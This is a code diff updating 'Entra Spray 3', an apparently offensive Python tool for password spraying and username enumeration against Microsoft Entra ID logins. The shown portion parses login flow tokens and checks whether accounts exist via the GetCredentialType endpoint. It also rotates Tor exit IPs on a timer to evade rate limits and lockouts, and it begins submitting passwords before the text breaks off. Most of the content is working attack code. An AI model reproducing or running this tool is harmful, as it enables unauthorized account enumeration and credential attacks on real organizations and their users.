@@ -1,9 +1,6 @@
-#########################################################
-
 # Entra Spray 3
-# Written By Shaked Wiessman #
-# Enjoy! #
-# 19/01/2026 #
+# Updated for Unicode Sanitization & Tor Stability
+# 28/01/2026
 
 import httpx
 import re
@@ -14,7 +11,7 @@ import argparse
 import os
 import sys
 
-# Colorsss
+# Colors
 RESET = "\033[0m"
 YELLOW = "\033[0;93m"
 CYAN = "\033[0;36m"
@@ -22,14 +19,22 @@ BOLD_YELLOW = "\033[1;33m"
 BOLD_RED = "\033[1;31m"
 BOLD_GREEN = "\033[1;32m"
 
-##############################################################
-
 def load_list(input_str):
     if os.path.isfile(input_str):
-        with open(input_str, "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    return [input_str]
-##############################################################
+        with open(input_str, "r", encoding="utf-8-sig") as f:
+            lines = []
+            for line in f:
+                clean_line = line.strip()
+                
+                clean_line = "".join(char for char in clean_line if char.isprintable())
+                clean_line = clean_line.replace('\u200e', '').replace('\u200f', '').replace('\ufeff', '')
+                if clean_line:
+                    lines.append(clean_line)
+            return lines
+    else:
+        
+        clean_input = "".join(char for char in input_str if char.isprintable())
+        return [clean_input.strip().replace('\u200e', '').replace('\u200f', '')]
 
 def generate_combinations(firstname, lastname):
     combinations = set()
@@ -39,12 +44,10 @@ def generate_combinations(firstname, lastname):
               l[0] + "." + f, f[0] + "." + l, f + "." + l[0], l + "." + f[0]]
     for c in combos: combinations.add(c)
     return sorted(combinations)
-##############################################################
 
 def get_pageid_from_response(response_text):
     match = re.search(r'<meta\s+name="PageID"\s+content="([^"]+)"', response_text)
     return match.group(1) if match else None
-##############################################################
 
 parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument("-user", dest="user")
@@ -55,10 +58,6 @@ parser.add_argument("-tenantname", dest="tenantname")
 parser.add_argument("-check", action="store_true")
 parser.add_argument("-proxytor", action="store_true")
 args = parser.parse_args()
-
-##############################################################
-##############################################################
-
 
 last_ip_renewal = time.time()
 renew_interval = 240
@@ -86,7 +85,6 @@ def renew_tor_ip():
     except Exception as e:
         print(f"{BOLD_RED}[✗] Failed to renew TOR IP: {e}{RESET}")
 
-##############################################################
 
 usernames = load_list(args.user) if args.user else []
 passwords = load_list(args.password) if args.password else []
@@ -96,8 +94,6 @@ if args.firstname and args.lastname and args.tenantname:
 
 if args.proxytor: renew_tor_ip()
 
-##############################################################
-##############################################################
 try:
     for username in usernames:
         domain_name = username.split("@")[1] if "@" in username else "common"
@@ -106,7 +102,7 @@ try:
                 renew_tor_ip()
 
             try:
-           
+                
                 client.get("https://login.microsoftonline.com/")
                 res2 = client.get("https://www.office.com/login")
                 location = res2.headers.get("location")
@@ -120,7 +116,7 @@ try:
                 reset_match = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                 ctx = parse_qs(urlparse(unquote(reset_match.group()).split("ru=", 1)[-1]).query).get("ctx", [None])[0]
 
-              
+                
                 if args.check:
                     payload_exist = {"username": username, "flowToken": flowtoken}
                     res_exist = client.post(f"https://login.microsoftonline.com/{domain_name}/GetCredentialType", json=payload_exist)
@@ -131,14 +127,14 @@ try:
                     if is_exists:
                         msg = f"{BOLD_GREEN}[✓] Username: {username} exists{RESET}"
                         if is_federated:
-                            msg += f" {BOLD_YELLOW}(Federated - Skip Spray){RESET}"
+                            msg += f" {BOLD_YELLOW}(Federated - Managed Externally){RESET}"
                         print(msg)
                         if is_federated: continue
                     else:
                         print(f"{BOLD_RED}[✗] Username: {username} not found{RESET}")
                         continue
 
-               
+                
                 if password:
                     current_cookies = dict(client.cookies)
                     current_cookies.update({
